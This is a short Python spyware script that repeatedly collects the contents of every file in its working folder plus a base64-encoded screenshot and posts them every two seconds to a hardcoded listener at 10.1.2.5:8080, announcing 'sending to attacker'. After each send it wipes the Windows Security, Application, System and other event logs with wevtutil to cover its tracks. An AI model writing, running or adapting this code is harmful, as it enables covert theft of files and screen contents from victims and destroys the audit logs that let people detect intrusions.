import pyautogui
import base64
from subprocess import check_output
import os
import sys
from pynput import keyboard
import requests
import json

#  The Timer module is part of the threading package.
import threading

# our data
targeted_folders = ["."] #change this to your preference :D


#may need to adapt this to your specifications
ip_address = "10.1.2.5"
port_number = "8080"

# Time interval in seconds for code to execute.
time_interval = 2

#init clean
if os.path.isfile("img.png"):
    os.remove("img.png")


def send_post_req():
    try:
        targeted_files = []
        payload=""
	
        #gather targeted files from the folders we hardcoded
        for folder in targeted_folders:
                temp_file = [file for file in os.listdir() if os.path.isfile(file)]
                targeted_files+=temp_file

        #format content of files into the payload
        for file in targeted_files:
                content=open(file, "r")
                payload+="\nfile : "+file+"\n"+content.read()+"\u0001"
                print(file+" processed")


        #add screenshot, png is being a b*tch, sending it separetly
        screenshot = pyautogui.screenshot("img.png") #take screenshot and save it to img.png
        print("created img.png !")
        content_from_screen=open("img.png","rb")
        get_texted=base64.b64encode(content_from_screen.read())
        payload+="\nfile : "+"img.png"+"\n"+get_texted.decode()+"\u0001"
        content_from_screen.close()



        # We send the POST Request to the server with ip address which listens on the port as specified in the server code.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload)

        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)

        # We start the timer thread.
        timer.start()

        #clean after everytime we interact
        os.remove("img.png")
        clean_logs()

    except Exception as e:

        print("Couldn't complete request!")
        print(e)



def clean_logs():

        eventlogs = ['Security' , 'Application' , 'System' , 'Setup', 'Internet Explorer']


        for event in eventlogs:
                try:
                        check_output(["wevtutil.exe" , "cl" , event.strip("\r")])
                        print("Logs Deleted Successfully .\n".format(event))
                except:
                        print("Failure to delete logs.\n".format(event))







print("sending to attacker")
send_post_req()
